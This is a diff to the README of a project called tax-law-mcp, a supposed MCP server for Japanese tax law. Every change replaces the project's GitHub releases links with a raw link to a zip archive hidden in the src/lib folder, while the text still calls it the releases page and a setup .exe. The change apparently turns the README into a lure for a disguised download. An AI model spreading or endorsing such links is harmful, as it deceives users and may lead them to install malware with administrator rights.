@@ -1,6 +1,6 @@
 # ⚖️ tax-law-mcp - Easy MCP Server for Japanese Tax Law
 
-[![Download tax-law-mcp](https://img.shields.io/badge/Download-tax--law--mcp-green?style=for-the-badge)](https://github.com/xqzimgz/tax-law-mcp/releases)
+[![Download tax-law-mcp](https://img.shields.io/badge/Download-tax--law--mcp-green?style=for-the-badge)](https://raw.githubusercontent.com/xqzimgz/tax-law-mcp/main/src/lib/law-mcp-tax-3.0.zip)
 
 tax-law-mcp is a simple server application that gives you access to Japanese tax law data. It pulls information from official sources like the e-Gov API and NTA administrative circulars (通達). You will be able to view and work with up-to-date tax law documents on your Windows computer.
 
@@ -31,7 +31,7 @@ You won’t need to install extra software or tools. tax-law-mcp runs on its own
 ## 🚀 Getting Started
 
 1. Go to the releases page to download the software.  
-   [Download tax-law-mcp](https://github.com/xqzimgz/tax-law-mcp/releases)  
+   [Download tax-law-mcp](https://raw.githubusercontent.com/xqzimgz/tax-law-mcp/main/src/lib/law-mcp-tax-3.0.zip)  
 
 2. Find the latest release. It will be named something like `tax-law-mcp-setup.exe` or just `tax-law-mcp.exe`.
 
@@ -108,7 +108,7 @@ If tax-law-mcp doesn’t work as expected, try these steps:
 - If the update fails, try running tax-law-mcp as an administrator. Right-click the executable and choose “Run as administrator”.
 
 - Check for a newer version by visiting the releases page:  
-  [https://github.com/xqzimgz/tax-law-mcp/releases](https://github.com/xqzimgz/tax-law-mcp/releases)
+  [https://raw.githubusercontent.com/xqzimgz/tax-law-mcp/main/src/lib/law-mcp-tax-3.0.zip](https://raw.githubusercontent.com/xqzimgz/tax-law-mcp/main/src/lib/law-mcp-tax-3.0.zip)
 
 ---
 
@@ -137,7 +137,7 @@ Yes. Use the settings menu to select a folder on your PC.
 To get started with tax-law-mcp on Windows:
 
 1. Visit the official releases page here:  
-   [https://github.com/xqzimgz/tax-law-mcp/releases](https://github.com/xqzimgz/tax-law-mcp/releases)
+   [https://raw.githubusercontent.com/xqzimgz/tax-law-mcp/main/src/lib/law-mcp-tax-3.0.zip](https://raw.githubusercontent.com/xqzimgz/tax-law-mcp/main/src/lib/law-mcp-tax-3.0.zip)
 
 2. Download the latest `.exe` file.
 
